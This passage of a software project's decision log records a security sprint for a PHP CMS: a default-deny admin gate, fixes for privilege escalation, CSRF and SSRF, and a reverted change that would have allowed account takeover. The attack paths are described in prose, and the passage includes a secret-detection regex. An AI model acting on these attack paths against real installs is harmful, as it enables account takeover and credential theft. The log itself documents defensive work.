- Why: (a) D-018 put the authorization axis above everything and that ordering is not re-opened on the assistant's initiative; (b) reachability was assessed rather than assumed and is low — `vendor-ai/` loads lazily from a single call site, there is no cookie jar and no user-controllable URL in the AI module, so four of the five have no path in this codebase; (c) re-vendoring touches 482 tracked files in a **released** product with an installed base, which needs a verification step of its own — "does AI chat still work after the bump?" — that the playground cannot fully exercise without a real provider API key.
- Scope of the future slice, fixed now so it is not re-litigated: bump `guzzlehttp/guzzle` to ≥ 7.12.1 and `guzzlehttp/psr7` to ≥ 2.12.1 via `composer install -d installer`, review the resulting diff, re-run `composer audit -d installer` to zero, update `LICENSE-THIRD-PARTY.md` versions, and let `tests/Unit/VendorAiManifestTest.php` prove the four records still agree. **Verified at triage time, so the cost is known:** `soukicz/llm` 0.5.0 requires `guzzlehttp/guzzle: ^7.9`, so both fixes are constraint-compatible — a re-vendor, not a dependency-tree rewrite. It carries an Estimate v2.
- Stated plainly rather than buried: until that slice runs, every Klytos install that uses AI chat carries five known-vulnerable dependencies. The one with a real path is **CVE-2026-55568** — Guzzle honours `HTTP_PROXY`/`HTTPS_PROXY` from the environment whether the application asks or not, so on a host that sets them an LLM API key can leave over cleartext. Klytos cannot prevent this from application code.
- Alternatives rejected (and why): **re-vendor inside Sprint 1** (cheap while the manifest is fresh, and the sprint is security work — but the sprint's subject is *authorization* specifically, and a 482-file diff reviewed alongside the gate work is exactly the tangling D-025 refused for `phpcbf`); **guzzle-only minimal fix** (closes the single reachable CVE with the smallest diff — genuinely defensible, but it splits one re-vendor into two, doubling the "does AI chat still work" verification for no reduction in total work); **accept permanently** (rejected — nothing in this project's triage has been written off as permanent, and a self-updating CMS with production installs carrying known-vulnerable code needs a closing date, not an acceptance).
- Supersedes: none — applies D-022's standing rule to its first real finding.

## D-030 — The integration tier isolates by snapshot/restore of the whole playground, and fails loudly where it cannot
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 — deferred item resolved before slice 3
- Decision: The integration tier snapshots `installer/config/` and `installer/data/` before every test and restores them afterwards (`tests/PlaygroundState.php`, used by `IntegrationTestCase`). Isolation is **ON by default for every test in the tier**, opt-out only with a recorded reason. Where a file-level restore provably cannot reach — in-memory caches held by the booted App singleton — the primitive does **not** pretend to cover it: `assertConfigNotMutated()` fails the test with instructions instead.
- Why: The slice-1 `code-reviewer` pass raised that the tier shares the App singleton *and* the real on-disk playground with no rollback. Slice 1's tests were read-only, so nothing broke; slices 3-5 assert refusals on state-changing surfaces, and they would have become order-dependent within a run while permanently mutating the playground across runs.
- Why snapshot/restore and not per-test fixtures (the sprint file left both open): **the requirement decides it.** Slice 3's own test point requires proving the v1.x migration is idempotent, which means DELETING the seeded owner and re-running boot. That record belongs to the seed, not to the test, so a create-and-destroy fixture cannot express it. The cost objection does not apply either — a seeded playground is **31 files / ~124K**, so a full copy per test is microseconds; measured suite time went from 0.049s to 0.187s for 14 tests.
- Verified before deciding, not assumed (subagent scan of `installer/core/`): the storage layer memoizes **nothing** — `FileStorage::read/list/count/exists`, `UserManager` and `SiteConfig` touch the filesystem on every call — which is exactly why a file-level restore is sound for the users, pages and site-config records slices 3-5 assert against. Four caches survive a restore and are named in the trait's docblock with file:line: `App::$config` (app.php:217, read once at boot, **no invalidation path at all**), `EncryptionLevelTrait::$cachedEncryptionLevel` (held by the live storage object — the sharpest, because a stale value corrupts writes rather than reading stale data), `OptionsManager::$cache` plus its static `$sensitivityRegistry`, and `AiKeyManager::$cache`.
- Proven, not asserted: `tests/Integration/PlaygroundIsolationTest.php` deletes a seeded user, confirms the mutation took effect and the on-disk fingerprint changed, then asserts the next test sees the untouched playground — record restored **and** byte-for-byte fingerprint match, including permission bits. Demonstrated to FAIL with isolation disabled (`testBPlaygroundIsRestoredForTheNextTest` → "the playground was NOT rolled back") before being trusted; the proof run really did delete the user, and the playground was reseeded afterwards.
- Alternatives rejected (and why): **per-test fixtures** (cheapest and needs no primitive, but cannot express slice 3's migration test, as above); **adding `App::reset()` to the product** (would close the `App::$config` gap properly — but it is core surgery on a singleton in a sprint whose subject is authorization, exactly the tangling D-025 refused for `phpcbf` and D-026 refused for `Hooks::doAction()`); **reflection on the private `$instance`/`$config`** (no product change, but silently couples the harness to private internals that may be renamed with no compiler to catch it); **opt-in isolation per test** (cheaper, but which tests mutate is precisely what cannot be known in advance — a helper three calls deep writing a rate-limit counter is still a mutation).
- Ordering detail that is load-bearing: the snapshot is taken **before** `App::boot()`, because boot itself writes (Step 10b's migration, the action scheduler). Restore runs before the config assertion, so the playground is left correct even when the assertion fails.
- Trigger for revisiting: the first test that genuinely needs to mutate core config, options, the encryption level or AI keys. At that point either run it with `#[RunInSeparateProcess]` or reopen the `App::reset()` question as its own change — not in passing.
- Supersedes: none. Resolves the "Storage isolation for the integration tier" deferred item (PROGRESS.md) and sprint-1 risk 4.

## D-031 — A crash on the migration path is fixed inside slice 3, not deferred like NEW-03/NEW-05
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 3 (user decision, overriding the assistant's recommendation)
- Decision: The uncaught throw from `UserManager::migrateFromV1Config()` at `App::boot()` Step 10b — which takes down every request on an install whose v1 config has no usable `admin_email` — is **fixed inside slice 3**. `installer/core/app.php` wraps the call in `try`/`catch( \RuntimeException )`, logs via `error_log()`, and lets boot continue with no owner record, which is fail-closed.
- Why the assistant was wrong to propose deferring it: the recommendation leaned on the D-026 / D-029 precedent ("found in passing → record with a trigger"). That precedent does not apply here. NEW-03 is a signature change to `Hooks::doAction()` backing 301 registered actions; NEW-05 is a re-vendor across 482 files. Both are large changes in *other* subsystems. This is a `try`/`catch` in the exact boot path slice 3 is already modifying and, per D-021, already obliged to test. The user's objection — "why would you not fix a bug that produces a crash?" — was correct: fixing a crash in code you are already changing and already testing is completing the work, not widening it.
- Why `error_log()` and not the Klytos logger — verified, and it caught a real defect: the first implementation called `$this->logger->write()`. `$this->logger` is lazily built by `getLogger()`, whose `Logger` constructor takes a **non-nullable** `PluginLoader`, and `$this->pluginLoader` is not assigned until Step 12 — well after Step 10b. That code would have raised a `TypeError` and crashed boot on exactly the path it exists to protect, and it would have escaped every test because it only fires on a damaged config. PHP's error log is the only sink that reliably exists this early in boot.
- Stated plainly rather than buried: this converts an undiagnosable fatal into a logged, fail-closed denial. **It does not restore access.** With no owner record, login cannot succeed either. That gap — no CLI user-create, no password reset, no owner repair anywhere in the product — is a distinct defect recorded as **NEW-08**, triggered with the NEW-03 slice after Sprint 1. It was not folded in here because it is new functionality with its own design and test point, not a fix.
- Verified: `scripts/dev/upgrade-test.sh` boots a real v0.30.1 install upgraded to the working tree and asserts `App::boot()` completes without a fatal; `tests/Integration/V1MigrationTest.php` pins both that the migration throws on an unusable `admin_email` and that a rejected migration leaves **no** owner behind — a half-written owner with an empty password hash would be worse than the crash it replaced.
- Alternatives rejected (and why): **record with a trigger and do not fix** (the assistant's original proposal — rejected by the user, and rightly: it leaves a known crash in a released product for no gain, since the fix is three lines in code the slice already touches); **fix the crash AND build the recovery path in the same slice** (complete, but recovery is new functionality that would roughly double a slice whose subject is the escalation); **catch `\Throwable` rather than `\RuntimeException`** (broader, but it would also swallow programming errors such as the `TypeError` described above — precisely the class of defect that must stay loud).
- Supersedes: none. Narrows the scope of the D-026/D-029 "defer what is found in passing" pattern: it applies to adjacent subsystems, not to the code path the slice is already changing and testing.

## D-032 — Authorization is enforced centrally, keyed by executed file, and denies by default
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 4
- Decision: The admin authorization gate moves from 66 individually-remembered per-file checks to a single enforcement point. `installer/core/admin-gate.php` holds a **gate map** (65 admin surfaces → required capability), and `admin/bootstrap.php` — which all 66 admin files require — calls `klytos_enforce_admin_gate()` once, after its auth guard. A surface **absent** from the map is REFUSED. `klytos_require_permission()` and `klytos_deny()` are added to `helpers-global.php` as the reusable enforcing counterparts to `klytos_has_permission()`, and Sprint 2's MCP gating consumes the same pair.
- Why this shape and not "add 51 missing calls": the audit's own remediation note asked for a call at the top of every file, and that has the identical failure mode one file later — a new admin page defaults to OPEN. Default-deny inverts it: a new page is refused until someone maps it deliberately, and `scripts/keel-verify` fails the build when a file under `admin/` has no entry. The 51 missing gates were never a discipline problem; they were a design in which forgetting was possible.
- Verified before relying on it, not assumed: **all 66 admin files require `admin/bootstrap.php`** (checked mechanically, zero exceptions), which is what makes one call sufficient. `plugin-page.php` was already gated correctly via `Router::handleDynamicRoute()`'s shape (`core/router.php:438-447`); that shape was **promoted** into `klytos_deny()` rather than a second one being invented.
- Keyed by **path relative to `admin/`**, not basename: six filenames (`ai-chat.php`, `logs.php`, `plugins.php`, `tasks.php`, `terminal.php`, `translations.php`) exist in BOTH `admin/` and `admin/api/`, and a basename key would silently collapse six pairs of unrelated surfaces onto one capability.
- Resolved from **`SCRIPT_FILENAME`**, not `SCRIPT_NAME`: the latter is URL-derived and therefore caller-influenced. A path that does not resolve inside `admin/` yields no key and is denied — traversal resolves to its real location and fails the prefix test.
- `bootstrap.php` is deliberately **unmapped**, so a direct request for it hits default-deny. It hosts the gate; it is not a surface the gate protects. `keel-verify` asserts it stays unmapped.
- **Refusal shape is part of the contract, not cosmetics.** `klytos_deny()` answers JSON for `api`/`mcp`, stderr+exit(1) for `cli`, and a self-contained escaped HTML document for pages. The page document carries no admin chrome on purpose: the gate runs before a page has built its own context, and a gate that can fatal while rendering a refusal is not a gate — the same reasoning L-006 recorded for the boot-time logger. Four pages (`logs`, `system-options`, `translations`, `terminal`) previously *redirected to the dashboard* on denial, which a caller cannot distinguish from "moved"; they now refuse with 403.
- **Five capabilities added** to the one matrix (S-04 is preserved — `UserManager::hasPermission()` remains the single decision point): `profile.edit`, `security.self`, `ui.preferences` (all four roles — the self-service tier, which nothing in the pre-existing 22 expressed, since `users.manage` is owner-only and would have locked every non-owner out of their own password), `setup.run` (owner-only) and `ai.use` (owner+admin, see D-035). Expressed as capabilities rather than an "authenticated, no capability" marker so that ONE mechanism decides authorization, filterable through `auth.capabilities` like every other row. Recorded upgrade note: a role added later does NOT inherit these and is denied its own profile until the matrix says so — the correct failure direction, and a real consequence.
- **Page-level is a floor, not a ceiling.** Pages mixing tiers map at the level needed to SEE them and re-gate privileged branches inline (`index.php` → `site.configure` on the indexing toggle; `pages.php` → `pages.delete` on trash/purge; `tasks.php` → `tasks.manage`; `security.php` → `site.configure` on the encryption branch). Mapping those pages at the higher tier instead would have locked editors and viewers out of the page list entirely.
- Extension points, with the risk stated rather than buried: `admin.gate_map` (filter) lets a plugin gate its own files and CAN weaken a shipped gate — exactly as the pre-existing `auth.capabilities` filter can; both are plugin-trust boundaries and plugins already run as first-party code here. What it cannot do is open a hole by omission, since removing an entry denies. `auth.access_denied` (action) is the audit hook and deliberately **cannot reverse the decision** — a filter that could turn a denial into a grant would put authorization back in third-party hands, which is the failure S-07 exists to close.
- Alternatives rejected (and why): **per-file `klytos_require_permission()` calls in all 66** (what the audit note suggested, and closest to the existing code — but it preserves the exact defect, since file 67 can still forget); **gating in the web server / `.htaccess`** (no capability awareness, and the product supports storage backends and a renameable install directory); **a route table in front of the admin** (cleanest long-term, but it is a rewrite of the admin entry model in a security sprint, and the theme-package sprint D-023 will revisit routing anyway).
- Supersedes: none. Closes audit **S-07**, and closes the *access* half of S-01, S-02, S-03, S-05 and S-06 — each of which slice 5 still proves individually with its own named test, and S-12's CSRF/state-changing-GET half remains slice 5's.

## D-033 — Four live bugs found by the slice-4 survey are fixed inside the slice
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 4 (user decision)
- Decision: The file-by-file survey of all 66 admin surfaces surfaced four defects the adoption audit had not recorded. All four are fixed in slice 4 rather than deferred: **NEW-09** (`api/webauthn-challenge.php` was not in the auth-guard exemption list, so passkey second-factor login could not work at all), **NEW-10** (`setup-wizard.php` required authentication but checked no role, so on a fresh install any authenticated user could complete setup and mint themselves an MCP application password), the `Auth::isLoggedIn()` fatal in `api/download-identity.php`, and the hand-rolled `in_array( $role, ['owner','admin'] )` in `admin/security.php`.
- Why this is completing the work rather than widening it: D-031 narrowed the D-026/D-029 "defer what is found in passing" pattern to *adjacent subsystems*, not to the code path the slice is already changing and testing. All four sit in exactly the code slice 4 rewrites — the bootstrap auth guard, and the gate applied to those three files. Deferring them would have meant shipping a gate on an endpoint that still fatals, and a wizard the gate protects while its own escalation stays open.
- Verified live, not inferred from reading: `api/download-identity.php` was driven as an authenticated owner against the playground and returned `Fatal error: Call to undefined method Klytos\Core\Auth::isLoggedIn()` — the endpoint has been dead in production for everyone, not merely ungated. `Auth` defines `isAuthenticated()` and `is2faPending()`; there is no `__call`.
- The `security.php` replacement is behaviour-preserving by construction: `site.configure` resolves to the same owner+admin set the hand-rolled check allowed. What changes is that the matrix decides (so a future change to it reaches this branch) and that a refusal is now a refusal — previously a non-admin POST fell through every `if` and re-rendered the page with no error, indistinguishable from a no-op. Its `$isAdminRole` guard appeared on **four** branches, not one; all four were converted, and the variable's removal without converting all four would have silently turned three privileged actions into no-ops.
- `api/download-identity.php` additionally stops deciding owner-ness by comparing the session username against `config['admin_user']`. The ROLE is the authority on privilege, not string equality with a config value; the gate maps it to `users.manage`, which is owner-only. Stated rather than buried: an install where the owner-role holder differs from `config['admin_user']` changes behaviour here — that divergence should not exist after the v1→v2 migration, and if it does, the role is the right answer.
- Alternatives rejected (and why): **record all four with triggers** (consistent with D-026/D-029 at first glance, but those precedents cover other subsystems; here it would ship a knowingly-fatal endpoint behind a brand-new gate); **fix only the fatal** (smallest diff, but the wizard escalation is a live privilege escalation found in the same pass, and leaving it is the opposite of the sprint's purpose).
- Supersedes: none. Applies D-031's narrowing to its first real test.

## D-034 — A plugin admin page that declares no capability is denied, not waved through
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 4 (user decision)
- Decision: `admin/plugin-page.php` previously read `$requiredCapability !== null && !klytos_has_permission( ... )`, so a plugin whose manifest declared no `capability` had its gate **skipped entirely** — the page was open to any authenticated user, viewer included. It now refuses with a developer-facing message (`plugins.page_declares_no_capability`, added to all 20 catalogues) telling the plugin author to declare one.
- Why: an undeclared capability is not a grant; it is a plugin that has not answered the question. Default-deny is the whole subject of this slice, and an opt-out that a third party gets by omission is the largest possible hole in it.
- Cost, stated plainly: this is a **breaking change for third-party plugins** in the wild that register admin pages without a `capability`. Verified first — **no shipped plugin registers an admin page at all** (`klytos-forms`, `klytos-importer`, `klytos-x402-coinbase`), so there is no first-party breakage; and the fix for a plugin author is one array key. Installed base is real (`Installed base: yes`), so this belongs in the release notes as a breaking change.
- Alternatives rejected (and why): **fall back to a floor capability such as `site.configure`** (nothing breaks outright, but it silently grants admins access to plugin pages whose author never considered authorization — it converts an unanswered question into a confident wrong answer); **keep the skip and log a warning** (preserves compatibility perfectly and closes nothing, which is how the gap survived this long).
- Supersedes: none.

## D-035 — `ai.use` is owner+admin while NEW-02 is open, and deliberately excludes editor
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 4 (user decision)
- Decision: The AI chat surfaces (`admin/ai-chat.php` and the chat actions of `admin/api/ai-chat.php`) are gated on a new `ai.use` capability held by **owner and admin only**. `editor` is excluded.
- Why: the chat executes MCP tools, and per NEW-02 the MCP tool layer has **zero** permission checks until Sprint 2 (D-020). Reaching that surface is therefore owner-equivalent power over the CMS regardless of the caller's role — the tool layer will not re-check what the chat asks it to do. Granting `editor` a surface that amplifies to owner would hand out the escalation this sprint exists to close, through a different door.
- Rejected `mcp.manage` as the gate even though it resolves to the same owner+admin set: it means "may mint MCP credentials", not "may consume AI", and the next reader would inherit a wrong mental model at exactly the point where the model matters.
- Trigger to revisit: **Sprint 2 close.** Once the tool layer default-denies per-tool, `ai.use` should widen to `editor`, because at that point the chat can only do what the caller could already do.
- Alternatives rejected (and why): **owner+admin+editor now** (matches editor's content-authoring role and keeps the flagship feature usable for them — but it is exactly the amplification described above, and an over-permissive grant is harder to take back than to give); **owner-only** (tightest, but it locks admins out of the product's headline feature for the duration of a sprint with no security gain, since admins already hold `site.configure` and `mcp.manage`).
- Supersedes: none.

## D-036 — The `webauthn-challenge.php` auth-guard exemption is reverted: it opened an account takeover
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 4 (reverses part of D-033, on the strength of the slice's own `security-auditor` pass)
- Decision: The change approved under D-033 that added `api/webauthn-challenge.php` to `admin/bootstrap.php`'s pre-auth exemption list — intended to fix NEW-09, passkey second-factor login — was **implemented and then removed inside the same slice**. The endpoint stays behind the auth guard. NEW-09 is re-scoped as recorded-and-open, with a trigger, rather than closed.
- Why the original decision was wrong, and it was wrong on the facts rather than on judgement: the diagnosis behind it was incomplete. Verified against source before accepting the reviewer's finding — `is2faPending()` becomes true as soon as a caller supplies a correct **password** (`auth.php:112-118`); `webauthn-challenge.php:20` gates **all four** of its actions on `( isAuthenticated() || is2faPending() )`, including `register_challenge` and `register_complete`; and `TwoFactor::completePasskeyRegistration()` (`two-factor.php:507-530`) appends the credential, adds `'passkey'` to the enabled methods and sets `enabled = true` **without checking that the caller ever passed an existing second factor**, silently. A stolen password alone would therefore have let an attacker enrol their own authenticator and hold the account permanently — 2FA defeated by the change meant to repair it. The 302 redirect was the only thing preventing that, and removing it was the whole of the "fix".
- What makes the reversal unambiguous rather than a trade-off: the exemption **bought nothing**. Passkey login cannot complete regardless, because `TwoFactor::verifyPasskeyAssertion()` (`two-factor.php:586`) has **zero call sites** and `login.php:54-99`'s 2FA dispatcher has no `passkey` branch at all. So the change was pure added risk against a flow that was broken for a second, deeper reason nobody had reached yet. Net effect on that surface would have been negative.
- Process note, recorded because it is the transferable part: the user approved this fix on the basis of the assistant's diagnosis, and that diagnosis was incomplete — it identified the redirect and stopped, without asking what the endpoint would then permit or whether the flow could actually complete. The reversal was made unilaterally in the direction of SAFETY (the tree is never left holding a takeover primitive while a question is outstanding) and reported to the user immediately, with the fix's true scope, rather than being carried to the commit.
- Consequences: NEW-09 stays open with its fix shape written down so the next slice does not re-derive it — restrict the registration actions to fully-authenticated callers, expose only `auth_challenge` pre-auth, add the missing `passkey` dispatcher branch wired to `verifyPasskeyAssertion()`, and notify the owner on enrolment. Bound to the NEW-11 slice, since both are authentication. **A standing warning is recorded for slice 7:** `api/comment-submit.php` is the next file due to join `$preAuthScripts` (S-09), and an entry there removes the only authentication check standing in front of whatever that file does internally.
- Alternatives rejected (and why): **keep the exemption and restrict the endpoint's actions in this slice** (the correct end state, and it would have kept the approved fix — but it means changing `webauthn-challenge.php`'s internals and `TwoFactor`'s registration path, which is a second subsystem with its own test point, in a slice already carrying the systemic gate); **keep the exemption and note the risk** (rejected outright — it ships a known, verified account-takeover primitive in a released product, which no schedule justifies).
- Supersedes: the `webauthn-challenge.php` element of **D-033** only. The other three fixes recorded there (the setup-wizard escalation, the `download-identity.php` fatal, the `security.php` hand-rolled check) stand and are tested.

## D-037 — The locale catalogues are confirmed safe; the gate's `api_key` pattern is narrowed
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 4 (user confirmation, per the confidential-data rule)
- Decision: The 20 files under `installer/core/lang/` are **confirmed by the user to carry no confidential data**, and the gate's `api_key` pattern is narrowed so this stops recurring.
- What the gate matched, and why it is a false positive: the pattern `api[_-]?key["']?[[:space:]]*[:=]` matched `"api_key":` — a **translation key** whose value is the user-interface label *"Gemini API key"* (`en.json:382-384`, and its 19 translations). Verified rather than assumed: the match is present at **HEAD**, so it predates this slice; slice 4's own additions contain nothing matching the pattern (`git diff --cached | grep -i api_key` → empty); and no catalogue contains any long opaque string (`grep -E '"[A-Za-z0-9_-]{32,}"'` → no hits). The files are only scanned now because slice 4 modified them, and the gate scans staged files rather than the diff.
- Why the pattern is narrowed rather than the files exempted: exempting `installer/core/lang/` would blind the gate to a whole directory permanently, and a real key pasted into a translation value is a plausible mistake. The pattern is the thing that is wrong — it matches an `api_key` **key name** as readily as an assignment of a secret **value**. It now requires something value-shaped after the separator (a quoted or bare run of at least 16 key-like characters), so `"api_key": "Gemini API key"` no longer matches while `api_key = "<32 opaque chars>"` still does.
- Verified after changing it, not assumed: the 20 catalogues pass the gate, and a synthetic file containing a realistic assignment is still **BLOCKED** — the same discipline D-015 applied when the gate was first installed. An unverified gate is not a gate, and a *loosened* unverified gate is worse than none.
- **`--no-verify` was ultimately NOT used, and that is the better outcome.** The user's confirmation authorised a bypass, but narrowing the pattern first made the bypass unnecessary: slice 4 committed cleanly through the gate (`6e293f3`). Fixing the check beat exempting the commit, which is the general preference — a bypass leaves the next person with the same block and one more precedent for reaching for `--no-verify`.
- Supersedes: none. Refines the gate installed by D-015.

## D-038 — Keel's build-assets source-first contract is overridden, with Phase 7 as the trigger
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 5 (Keel v3.3.0 → v3.4.0 post-update reconciliation; user decision)
- Decision: Keel v3.4.0's "Build assets — source first, minified for production" contract is **not adopted now**. Klytos continues to ship its first-party front-end assets **unminified**, no `scripts/build-assets` minify script is created, and the enqueue sites are left alone. The contract's review trigger is **Phase 7**, whose release gate already regenerates and verifies assets on the candidate. The contract is explicitly developer-overridable by a recorded decision, and this is that decision.
- Measured before deciding, not assumed: the repo tracks **68** `*.min.*` files and **every one** is third-party vendored under `installer/admin/assets/vendor/` — TinyMCE, React, FontAwesome, highlight.js, marked, DOMPurify, Sortable. Verified with `git ls-files | grep -E '\.min\.(js|css)$' | grep -v '/vendor/'` → **no output**. The **33** first-party JS/CSS files ship unminified, and `grep` for `minify|terser|uglify|cssnano|esbuild` across the repo returns nothing: there is no minify tooling at all.
- Why the override is safe rather than a deferral of risk: the defect the contract exists to prevent is **source↔minified drift** — a hand-edited `.min.*` silently diverging from its source. That failure mode **cannot occur here**, because no first-party minified file exists to drift. Vendored `.min.*` are upstream distribution artifacts the project does not produce, structurally the same case as `installer/vendor-ai/` (D-028); regenerating them from source is not Klytos's job and would in fact be a defect. So the reconciliation found **zero** drift to fix. What is unadopted is only the contract's other half — that production *should* load minified — which is a performance improvement, not a correctness or security one.
- Cost of adopting it now, which is why it was not: the 33 assets are referenced by **hardcoded literal paths** scattered across ~15 admin PHP files, plus two sites in `installer/core/build-engine.php` (`:795` for `klytos-hooks.js`, `:2151` for `klytos-analytics.js`) that write `<script>` tags **into generated production sites**. Adoption therefore changes what ships to every install of a released product with a real installed base, and needs its own test point. Doing that inside a sprint whose subject is authorization is precisely the tangling refused by D-025 (`phpcbf`), D-026 (`Hooks::doAction()`), D-029 (the 482-file re-vendor) and D-031's narrowing.
- Alternatives rejected (and why): **adopt now** (correct end state, but it is an asset-pipeline change with production reach landing in the middle of a security slice, and it is the only reconciliation item that is not already satisfied); **adopt as its own slice after Sprint 1, alongside the D-029 CVE re-vendor** (genuinely attractive — that slice is already an asset-tree-wide change with its own Estimate v2 — but it front-loads a performance change ahead of remediation work, and Phase 7 reaches it anyway by construction).
- Supersedes: none. Records the Keel v3.4.0 Table 3 action for this project as **overridden**, which is one of the two outcomes that action itself allows.

## D-039 — The config-mutation guard was inert; it now compares decrypted content, minus volatile keys
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 5
- Decision: `PlaygroundState::assertConfigNotMutated()` — introduced by D-030 as "the honest half" of the isolation primitive — **could not fail**, and is repaired. It now captures the config file's bytes **before** `restorePlayground()` overwrites them, and compares **decrypted content with `scheduler_last_run` removed** rather than hashing the raw file.
- What was wrong, and it was wrong from the day it shipped: the method runs after `restorePlayground()`. That ordering is correct and deliberate (D-030: the playground must be left clean even when the assertion fails) — but the method then re-read the file *live*, which is the file the restore had just put back. Every comparison was the snapshot against itself. The guard had been carrying the credibility of the whole integration tier since slice 3 and was checking nothing.
- Proven, not reasoned: a probe test wrote a marker key into core config and **passed green**. After the repair the same probe **failed** with the intended message. Both directions were observed before anything relied on it — the discipline slice 2 applied to the manifest drift guard and slice 3 to the migration test.
- Why the comparison moved from a file hash to decrypted content, which is a second defect the repair had to absorb: (a) the file is **encrypted**, so rewriting byte-identical content still produces different ciphertext — a byte comparison cannot distinguish "changed" from "written again"; (b) `ActionScheduler::setConfigValue()` (`action-scheduler.php:398`) writes `scheduler_last_run` whenever due actions are processed, and `App::boot()` triggers that on **every** request. The HTTP tests boot a real server per request, so core config is rewritten from a separate process as a matter of course. The repaired byte-hash guard failed **ten healthy tests** immediately — a true observation about the file and a false one about the tests. A guard that cannot tell a background heartbeat from a test's own write gets switched off within a week, and then it is inert a second time.
- Undecryptable input fails **towards** noticing: if the ciphertext cannot be decrypted (a test changed the encryption level, a truncated write) the raw bytes are compared instead, so a difference nobody can read still counts as a difference. Treating "I cannot read this" as "nothing changed" is the failure mode being repaired, not a fallback to it.
- Regression cover, permanent rather than a throwaway probe: `tests/Integration/PlaygroundGuardTest.php` asserts both halves — a real config mutation trips the guard, and a `scheduler_last_run`-only change does not. It opts out of automatic isolation with a recorded reason (it IS the test of the primitive, so it cannot also be a client of it) and drives snapshot/restore by hand.
- Alternatives rejected (and why): **move the assertion before the restore** (the obvious repair, and it makes the live re-read correct — but it reverses D-030's safety ordering, so a failing assertion would leave the mutated playground in place for every following test, trading a silent false green for a loud cascade); **exempt the HTTP test classes from the guard** (fastest way to green, but it removes the check from exactly the tests that touch the most surfaces); **keep the byte hash and accept ten failures** (honest but unusable — the heartbeat is not a defect and a permanently red suite teaches people to ignore it).
- Supersedes: none. Repairs the mechanism D-030 specified; D-030's reasoning stands unchanged, its implementation did not.

## D-040 — The identity export becomes POST + CSRF, and its false docblock is corrected rather than implemented
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 5 (user decision on the scope question)
- Decision: `api/download-identity.php` now requires **POST** (405 otherwise, with `Allow: POST`) and verifies **CSRF** (403 otherwise). The `request_identity_download` branch in `admin/security.php` is **removed** and its form now POSTs **directly** to the endpoint. The docblock's three false claims — re-authentication with the current password, 2FA verification, an email notification to the owner — are **corrected to describe reality**, and the missing protections are recorded as audit finding **NEW-13**, bound to the authentication slice that owns NEW-09 and NEW-11. They are not implemented here.
- Why the form had to be retargeted rather than the endpoint merely hardened: the page gated on `users.manage` and then **302-redirected** to the endpoint, and a browser follows a 302 with a **GET**. That redirect *was* the reason a state-writing secret export answered GET — it was the normal path, not an edge case. A redirect cannot carry a POST, so no amount of hardening inside the endpoint fixes the caller; the form has to target the endpoint itself.
- The exposure, stated honestly rather than inflated: an attacker could force the owner's browser to issue the request via `<img src>` or a link, burning the 24-hour rate limit and writing config (`identity_last_downloaded_at`, `identity_download_count`). They could **not** read the key material back, because the response is `application/octet-stream` with `Content-Disposition: attachment`. So: CSRF yes, CSRF-to-key-exfiltration no. It is a denial-of-service and audit-noise vector against the owner, and it breaks the project's own "don't change state on a GET" rule — which is why it is fixed rather than argued down.
- Verified rather than assumed before relying on it: `$basePath` is assigned in `admin/templates/header.php:21`, which `security.php` requires at `:220` — above the form at `:551-552`. The L-006 trap (using a service or variable that is not yet in scope at the point it runs) was checked by reading the assignment line against the use line, not inferred. *(Line citations corrected after the `code-reviewer` pass: the first draft said `:218` and `:549`, written before the slice's own later edits shifted the file by two lines. A sentence whose point is "verified rather than assumed" cannot carry stale line numbers.)*
- The removed branch was removed with its exit condition stated (per **L-007**, which forbids deleting code as "dead" without establishing what would still execute it): a stale cached page could still POST `request_identity_download`. With the branch gone it falls through to a harmless re-render; with the branch kept it would redirect to a guaranteed **405** — a path that cannot succeed. The less misleading outcome wins.
- Test cover, one named test per property: `testS12IdentityExportRefusesAStateChangingGet`, `testS12IdentityExportRequiresCsrf`, and `testS12IdentityExportIsOwnerOnlyAndDoesNotFatal` (carried over from slice 4, still asserting on the response BODY per L-009). The first two were **proven to fail** against the unfixed code — 200 where 405 and 403 were required — before the fix landed. Independent confirmation arrived unbidden: the repaired D-039 guard fired on both tests against the unfixed code, because the GET really did write config, and stopped firing once the fix landed.
- Why the docblock is corrected instead of the protections built (the user's call): re-auth and 2FA are the authentication subsystem and an email notification adds a mail dependency — a second subsystem with its own test point, inside a slice already carrying six findings. The authentication slice is already opening that plumbing for NEW-09 and NEW-11.
- Alternatives rejected (and why): **implement re-auth, 2FA and the notification now** (strongest posture for the highest-value secret in the system, and defensible — but it is scope the sprint deliberately bounded, and D-031 narrowed the "fix what you touch" rule to the code path the slice is already changing, which this is not); **keep the redirect and add a one-time token** (preserves the existing UI flow, but invents a second single-use-token mechanism beside CSRF for no gain); **leave the docblock and add a TODO** (rejected outright — an unimplemented claim in a security docblock is the L-002 defect verbatim, and this one had already misled a reviewer once).
- Supersedes: none. Closes the remaining half of audit **S-12**; opens **NEW-13**.

## D-041 — SSRF is refused by one class applied at the influenced call sites, and redirects are walked by hand
- Date / phase: 2026-07-19 / Phase 5, Sprint 1 slice 6
- Decision: `Klytos\Core\SafeHttp` (`installer/core/safe-http.php`) becomes the single implementation of "may this URL be fetched", **promoted** from `KlytosImporter\ImportValidator::validateUrl()` rather than written fresh. It is applied at the call sites whose URL an untrusted party influences — `admin/api/oembed.php` (S-08), `core/webhook-manager.php` (both `create()` and `sendHttpPost()`), `core/integrity-checker.php::registerDeveloperKey()` — and `ImportValidator` now **delegates** to it. `klytos_http_get()` / `klytos_http_post()` are deliberately left unchanged. Reached via `klytos_safe_http()`.
- Why promotion and not a new implementation: the check already existed and worked; what it lacked was reach. Writing a second one would have created exactly the drift L-004 records — two surfaces describing the same rule, free to diverge, with the forgotten copy rotting. This is the same move slice 4 made when it promoted the denial shape out of `router.php:438-447` instead of inventing a second one.
